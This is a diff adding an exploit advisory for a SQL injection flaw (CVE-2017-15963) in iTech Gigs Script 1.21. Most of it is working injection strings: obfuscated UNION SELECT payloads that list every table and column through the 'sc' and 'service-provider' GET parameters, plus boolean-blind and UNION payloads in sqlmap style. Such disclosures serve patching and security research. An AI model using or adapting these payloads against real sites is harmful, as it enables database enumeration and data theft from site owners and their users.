@@ -1,0 +1,40 @@
+# # # # # 
+# Exploit Title: iTech Gigs Script 1.21 - SQL Injection
+# Dork: N/A
+# Date: 30.10.2017
+# Vendor Homepage: http://itechscripts.com/
+# Software Link: http://itechscripts.com/the-gigs-script/
+# Demo: http://gigs.itechscripts.com/
+# Version: 1.21
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-15963
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# http://localhost/[PATH]/browse-scategory.php?sc=[SQL]
+# 
+# -12c4ca4238a0b923820dcc509a6f75849b'++/*!08888UNIoN*/(/*!08888SELECT*/+0x283129,0x283229,0x283329,0x283429,0x283529,0x283629,(/*!08888SElEct*/+Export_sEt(5,@:=0,(/*!08888sElEct*/+count(*)/*!08888from*/(information_schEma.columns)whErE@:=Export_sEt(5,Export_sEt(5,@,/*!08888tablE_namE*/,0x3c6c693E,2),/*!08888column_namE*/,0xa3a,2)),@,2)),0x283829,0x283929,0x28313029)--+-
+# 
+# http://localhost/[PATH]/service-provider.php?ser=[SQL]
+# 
+# -9553'++/*!50000UNION*/+/*!50000SELECT*/+1,2,(/*!08888Select*/+export_set(5,@:=0,(/*!08888select*/+count(*)/*!08888from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!08888table_name*/,0x3c6c693e,2),/*!08888column_name*/,0xa3a,2)),@,2)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52--+-
+# 
+# Parameter: sc (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: sc=12c4ca4238a0b923820dcc509a6f75849b' AND 5747=5747 AND 'tzJH'='tzJH
+# 
+#     Type: UNION query
+#     Title: Generic UNION query (NULL) - 10 columns
+#     Payload: sc=-5921' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a6a7a71,0x74624c4f7167546e4676635467647269456244634147776d584b77796e4870674661646a7a44485a,0x717a6a7a71),NULL,NULL,NULL-- bjaB
+# 
+# Etc..
+# # # # #
